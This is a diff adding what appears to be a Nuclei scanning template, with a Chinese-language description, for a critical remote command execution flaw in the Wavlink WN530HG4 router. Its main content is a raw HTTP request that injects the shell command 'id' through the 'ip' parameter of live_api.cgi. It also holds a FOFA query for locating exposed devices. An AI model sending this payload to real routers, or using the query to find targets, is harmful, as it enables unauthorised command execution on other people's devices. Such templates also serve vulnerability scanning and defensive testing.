@@ -1,0 +1,31 @@
+id: poc-mk3hiy9xlzzbs382
+info:
+  name: wavlink_WN530HG4 live_api存在远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mk3hiy9xlzzbs382'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: mk3hiy9xlzzbs382
+    fofa: app="WAVLINK-WN530HG4" && body="wavlink"
+http:
+- raw:
+  - 'GET /cgi-bin/live_api.cgi?page=oa5&id=2&ip=;id; HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15
+
+    Connection: keep-alive
+
+    Accept: */*
+
+    Accept-Language: en
+
+    Accept-Encoding: gzip, deflate, br'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
